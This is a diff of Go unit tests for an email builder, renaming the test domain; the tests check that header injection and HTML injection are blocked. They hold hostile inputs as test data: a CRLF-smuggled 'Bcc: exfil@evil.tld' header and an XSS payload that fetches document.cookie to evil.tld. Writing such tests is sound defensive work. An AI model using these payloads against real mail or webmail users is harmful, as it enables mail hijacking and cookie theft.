@@ -68,8 +68,8 @@ func TestBuildMessageCannotInjectHeaders(t *testing.T) {
 	evilSubject := "You have been added\r\nBcc: exfil@evil.tld"
 	evilTo := "victim@example.test\r\nBcc: exfil@evil.tld"
 
-	raw := buildMessage("no-reply@bizverse.test", evilTo, evilSubject,
-		"<p>hello</p>", bulkHeaders("https://bizverse.test"))
+	raw := buildMessage("no-reply@allstuff.test", evilTo, evilSubject,
+		"<p>hello</p>", bulkHeaders("https://allstuff.test"))
 
 	msg, err := mail.ReadMessage(strings.NewReader(string(raw)))
 	if err != nil {
@@ -147,7 +147,7 @@ func TestBuildMessageCannotInjectHeaders(t *testing.T) {
 // needs. A message that fails to parse is silently dropped or, worse, delivered
 // with a mangled body.
 func TestBuildMessageIsWellFormed(t *testing.T) {
-	raw := buildMessage("no-reply@bizverse.test", "user@example.test", "Hello",
+	raw := buildMessage("no-reply@allstuff.test", "user@example.test", "Hello",
 		"<p>Hello <b>there</b></p>", nil)
 	text := string(raw)
 
@@ -217,7 +217,7 @@ func TestMimeBoundaryIsUniqueAndSafe(t *testing.T) {
 func TestWrapHTMLEscapesTitleAndURL(t *testing.T) {
 	const payload = `<img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">`
 
-	got := WrapHTML("https://bizverse.test", payload, "<p>safe body</p>")
+	got := WrapHTML("https://allstuff.test", payload, "<p>safe body</p>")
 
 	if strings.Contains(got, "<img src=x") {
 		t.Error("the title was not escaped; attacker-controlled markup reaches the recipient's webmail")
